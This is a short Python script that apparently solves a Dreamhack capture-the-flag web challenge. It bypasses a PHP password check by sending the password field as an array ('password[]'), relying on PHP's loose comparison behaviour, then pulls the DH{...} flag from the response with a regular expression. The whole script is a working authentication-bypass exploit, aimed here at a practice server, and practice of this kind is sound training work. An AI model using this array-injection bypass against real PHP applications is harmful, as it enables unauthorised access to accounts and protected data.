import requests, re

url = 'http://host3.dreamhack.games:12203'

# https://www.php.net/manual/en/types.comparisons.php

res = requests.post(url, data={'password[]': ''})
print(re.search(r'DH\{[^>]*\}', res.text).group(0))
